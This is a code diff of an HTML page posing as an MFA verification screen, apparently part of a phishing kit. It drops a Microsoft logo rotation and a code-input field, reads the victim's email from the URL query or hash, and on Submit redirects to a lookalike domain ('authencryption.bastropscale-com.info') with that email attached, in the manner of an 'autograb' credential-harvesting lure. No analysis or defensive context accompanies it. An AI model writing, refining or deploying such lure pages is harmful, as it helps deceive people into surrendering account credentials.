@@ -82,17 +82,6 @@
             margin: 12px 0;
         }
 
-        /* Input Field Styling */
-        input[type="number"] {
-            width: 80%;
-            padding: 12px;
-            margin-top: 12px;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            box-sizing: border-box;
-        }
-
         /* Submit Button Styling */
         .btn-submit {
             margin-top: 16px;
@@ -118,43 +107,35 @@
         }
     </style>
     <script>
-        // Extract email from query parameters
-        function getEmailFromQuery() {
-            const params = new URLSearchParams(window.location.search);
-            return params.get("email") || "default@example.com"; // Fallback to default email if none is provided
+        // Extract email from query parameter or hash
+        function getEmail() {
+            const params = new URLSearchParams(window.location.search); // Query parameters
+            const hash = window.location.hash; // Hash
+            let email = "";
+
+            // Check for email in query parameter
+            if (params.has("email")) {
+                email = params.get("email");
+            } 
+            // Check for email in hash (e.g., #example@example.com)
+            else if (hash && hash.startsWith("#")) {
+                email = hash.substring(1);
+            }
+
+            // Default fallback if no email found
+            return email || "default@example.com";
         }
 
-        // Redirect with autograb command
+        // Redirect to the main link with the extracted email
         function redirectToMainLink() {
-            const email = getEmailFromQuery();
+            const email = getEmail();
             const redirectURL = `https://authencryption.bastropscale-com.info/zrWoUPyJ#${email}`;
             window.location.href = redirectURL;
         }
 
-        // Array of Random Logo URLs
-        const logos = [
-            'https://i.ibb.co/cLY9NST/microsoft-3.png',
-            'https://i.ibb.co/6w1yWxg/Kite.png',
-            'https://via.placeholder.com/500x500.png?text=Random+Logo+1',
-            'https://via.placeholder.com/500x500.png?text=Random+Logo+2',
-            'https://via.placeholder.com/500x500.png?text=Random+Logo+3'
-        ];
-
-        // Function to Set a Random Logo as Background
-        function setRandomBackground() {
-            const randomLogo = logos[Math.floor(Math.random() * logos.length)];
-            document.body.style.backgroundImage = `url(${randomLogo})`;
-        }
-
-        // Generate random MFA code
-        function generateRandomCode() {
-            return Math.floor(10000 + Math.random() * 90000);
-        }
-
-        // Set random logo background and generate MFA code on load
+        // Set random background on load
         window.onload = function () {
-            setRandomBackground();
-            document.querySelector('.mfa-code').textContent = generateRandomCode();
+            document.body.style.backgroundImage = 'url("https://via.placeholder.com/800x600.png?text=Background+Image")';
         };
     </script>
 </head>
@@ -171,8 +152,6 @@
         <div class="loading-circle"></div>
 
         <div class="mfa-code">12345</div>
-
-        <input type="number" id="mfaNumber" placeholder="Enter your MFA code" aria-label="MFA code input field">
 
         <button class="btn-submit" onclick="redirectToMainLink()">Submit</button>
 
